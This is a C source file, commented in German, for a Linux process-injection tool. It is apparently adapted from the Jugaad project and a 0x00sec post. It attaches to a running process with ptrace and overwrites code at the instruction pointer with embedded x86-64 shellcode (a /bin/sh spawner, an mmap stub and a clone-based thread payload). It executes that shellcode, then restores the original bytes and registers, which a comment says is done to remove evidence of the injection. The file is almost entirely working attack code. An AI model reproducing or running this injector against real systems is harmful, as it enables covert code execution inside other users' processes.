//Code combiniert aus Jugaad & aus folgender quelle :https://0x00sec.org/t/linux-infecting-running-processes/1097
//compile gcc -m64 -o jugaad_64bit jugaad2.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>



#define SHELLCODE_SIZE 116

#define SHELLCODE_SIZE2 32
//size 32
//no mmap, no thread, just spwaning a shell (for testing and debugging if injection works)
unsigned char*shellcode0=  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";



//clone&stack& hallo_world+syscall_exit 
//This shellcoe is located in /shellcodes_jugaad/Threadpayload/asm/shellcode.txt
//size 116
unsigned char *shellcode = 
"\x48\x8d\x3d\x39\x00\x00\x00"
"\xeb\x00"
"\x57"
"\xeb\x16"
"\x48\x8d\xb0\xf8\xff\x3f\x00"
"\x8f\x06"
"\xbf\x00\x09\x01\x00"
"\xb8\x38\x00\x00\x00"
"\x0f\x05"
"\xc3"//<---- In the shellcode construction her shoud be a cc "int3", but setting it so results in a trap which is not calculated by jugaad2  
"\xbf\x00\x00\x00\x00"
"\xbe\x00\x00\x40\x00"
"\xba\x07\x00\x00\x00"
"\x41\xba\x22\x00\x00\x00"
"\xb8\x09\x00\x00\x00"
"\x0f\x05"
"\xeb\xcc"
"\xeb\x0c"
"\x48"
"\x65\x6c"
"\x6c"
"\x6f"
"\x20\x57\x6f"
"\x72\x6c"
"\x64\x0a\xb8\x01\x00\x00\x00"
"\xbf\x01\x00\x00\x00"
"\x48\x8d\x35\xe3\xff\xff\xff"
"\xba\x0c\x00\x00\x00"
"\x0f\x05"
"\xbf\x00\x00\x00\x00"
"\xb8\x3c\x00\x00\x00"
"\x0f\x05"
"\x90\x90";

//nach dem vorletzen x0f\x05 könnte man jump to thread_funk durch xeb\xe6 hinzufügen
//thread wird solange ausgeführt bis das ende des Stacks erreicht wird (x90\x90 am ende aber für passende größe entfernen)




//size 32
//mmap shellcode
unsigned char *shellcode2=
"\xbf\x00\x00\x00\x00"
"\xbe\x00\x00\x40\x00"
"\xba\x07\x00\x00\x00"
"\x41\xba\x22\x00\x00\x00"
"\xb8\x09\x00\x00\x00"
"\x0f\x05\xcc\x90\x90\x90";


unsigned char *
collect_data (pid_t pid, unsigned char *src, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  unsigned char* text=(unsigned char*)malloc(len);

  for (i = 0; i < len; i+=4, s++)//alignment für peekttext
    {
      uint32_t *tmp=(uint32_t *)(text+i);
      uint32_t pword=0;
      pword=ptrace (PTRACE_PEEKTEXT, pid, s, NULL);
	if(pword < 0)
	{
	  perror ("ptrace(PEEKTEXT):");
	  exit(1);
	}
    *tmp=pword;
    }
  return text;
}



int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

//programm has set the SHELLCODE with clone&stack&hallo_world as default 
//change var shellcode at### in inject&collect_data var  for testing other shellcodes
//do not forget the right size! 
int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  struct user_regs_struct empty ;
  int                     syscall;
  long                    dst;
  unsigned char* backup=(unsigned char*)malloc(SHELLCODE_SIZE);//###backup der größe de Shellcodes benötigt
  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);//set pid
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);
  sleep(10);
  //After attach child gets SIGSTOP
  
  
  ptrace(PTRACE_GETREGS, target,NULL,&regs);
  //copy registers-> 1 for backup 1 for exec
 memcpy(&empty,&regs,sizeof(struct user_regs_struct));
 empty.rdi=0;
 empty.rsi=0;
 empty.rdx=0;
 empty.r10=0;
 empty.r8=0;
 empty.r9=0;
 //Getting registers and Clean potential registers like r9 or r8 for mmap_syscall
 //they are not set in the shellcode!
 
  /* Inject code into current RPI position after Backup */
 printf("Getting Backups at %p\n",(void*)regs.rip);
 backup=collect_data (target, (void*)regs.rip, SHELLCODE_SIZE);

//inject the shellcode
  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
//now set the clean registers for exec
  printf("setting empty registers\n");
  if ((ptrace (PTRACE_SETREGS, target, NULL, &empty)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
	//execute the shellcode
  printf ("+ Run it!\n");
  ptrace(PTRACE_CONT, target,NULL,NULL);
  
  //shellcode has a SIGTRAP
  wait(NULL);
  sleep(5);
/*
 ptrace(PTRACE_GETREGS,target,NULL,&empty);
 printf("new mmap region at %p\n",(void*)empty.rax);

printf("CLeaning registers\n");
 empty.rdi=0;
 empty.rsi=0;
 empty.rdx=0;
 empty.r10=0;
 empty.r8=0;
 empty.r9=0;
ptrace (PTRACE_SETREGS, target, NULL, &empty);
printf("Injecting Thread code at RAX\n");
inject_data(target,shellcode,(void*)empty.rax+4096*2,SHELLCODE_SIZE);
ptrace(PTRACE_CONT, target,NULL,NULL);
  wait(NULL);

*/

//now remove evidenz of injection in target prozess
 inject_data (target, backup, (void*)regs.rip, SHELLCODE_SIZE);


 printf("setting old registers\n");
 ptrace(PTRACE_SETREGS, target,NULL,&regs);
 
printf("Detaching");
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}
